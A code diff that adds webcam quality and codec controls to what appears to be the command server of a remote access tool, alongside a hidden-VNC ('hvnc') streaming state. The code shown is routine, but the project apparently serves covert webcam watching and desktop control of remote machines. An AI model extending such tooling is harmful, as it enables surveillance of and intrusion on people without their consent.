@@ -482,11 +482,12 @@ function handleRemoteDesktopFrame(payload: any) {
 };
 
 export const hvncStreamingState = new Map<string, { isStreaming: boolean; display: number; quality: number; codec: string }>();
-export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean }>();
+export const webcamStreamingState = new Map<string, { isStreaming: boolean; deviceIndex: number; fps: number; useMax: boolean; quality: number; codec: string }>();
 
 export function handleWebcamViewerOpen(ws: ServerWebSocket<SocketData>) {
   const { clientId } = ws.data;
   const sessionId = uuidv4();
+  ws.data.sessionId = sessionId;
   const target = clientManager.getClient(clientId);
   const session: RemoteDesktopViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
   sessionManager.addWebcamSession(session);
@@ -554,7 +555,7 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
     return;
   }
 
-  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false };
+  const state = webcamStreamingState.get(clientId) || { isStreaming: false, deviceIndex: 0, fps: 30, useMax: false, quality: 90, codec: "" };
   switch (payload.type) {
     case "webcam_list":
       sendDesktopCommand(target, "webcam_list", {});
@@ -586,11 +587,21 @@ export function handleWebcamViewerMessage(ws: ServerWebSocket<SocketData>, raw: 
     case "webcam_start":
       if (!state.isStreaming) {
         sendDesktopCommand(target, "webcam_set_fps", { fps: state.fps, useMax: state.useMax });
+        sendDesktopCommand(target, "webcam_set_quality", { quality: state.quality, codec: state.codec });
         sendDesktopCommand(target, "webcam_start", {});
         state.isStreaming = true;
         webcamStreamingState.set(clientId, state);
       }
       break;
+    case "webcam_set_quality": {
+      const quality = Math.max(0, Math.min(100, Number(payload.quality) || 0));
+      const codec = String(payload.codec || "").toLowerCase();
+      state.quality = quality;
+      state.codec = codec;
+      webcamStreamingState.set(clientId, state);
+      sendDesktopCommand(target, "webcam_set_quality", { quality, codec });
+      break;
+    }
     case "webcam_stop": {
       const otherWebcamViewers = sessionManager.getWebcamSessionsForClient(clientId)
         .filter(s => s.id !== ws.data.sessionId);
